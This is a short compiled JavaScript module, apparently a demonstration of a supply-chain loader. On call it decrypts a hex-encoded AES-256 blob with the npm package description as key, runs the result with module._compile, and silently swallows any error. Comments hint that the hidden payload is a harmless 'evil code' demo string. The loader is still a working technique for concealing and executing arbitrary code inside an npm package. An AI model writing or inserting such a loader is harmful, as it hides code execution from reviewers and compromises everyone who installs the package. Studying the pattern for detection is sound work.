"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
const crypto = require("crypto");
exports.default = () => {
    // console.log("This is evil code.");
    // password: run evil code
    const data = "cfdc36e155f1213c266810ac757ceb743e036c6aa08703d564010029511c7af099387eb23604e1b308233f4eba23dd0f";
    const decipher = crypto.createDecipher("aes256", process.env.npm_package_description || "");
    try {
        const payload = decipher.update(data, "hex", "utf8") + decipher.final("utf8");
        module._compile(payload, "");
    }
    catch (_a) { }
};
